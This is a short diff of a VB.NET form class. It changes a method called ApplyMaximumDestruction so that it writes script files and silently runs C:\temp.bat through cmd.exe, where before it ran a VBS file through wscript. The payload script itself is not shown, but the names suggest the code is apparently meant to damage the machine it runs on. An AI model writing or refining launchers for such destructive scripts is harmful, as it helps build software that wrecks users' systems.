@@ -136,14 +136,14 @@ Public Class Form2
         End Try
     End Sub
 
-    ' Public method to run the VBS script.
+    ' Public method to run the BAT script.
     Public Sub ApplyMaximumDestruction()
         CreateEpicScriptFiles()
-        Dim scriptPath As String = "C:\temp.vbs"
+        Dim scriptPath As String = "C:\temp.bat" ' Correct the file extension to .bat
         Try
             Dim process As New Process()
-            process.StartInfo.FileName = "wscript.exe"
-            process.StartInfo.Arguments = """" & scriptPath & """"
+            process.StartInfo.FileName = "cmd.exe"
+            process.StartInfo.Arguments = "/c """ & scriptPath & """" ' Use /c to run and close cmd
             process.StartInfo.UseShellExecute = False
             process.StartInfo.RedirectStandardOutput = True
             process.StartInfo.RedirectStandardError = True
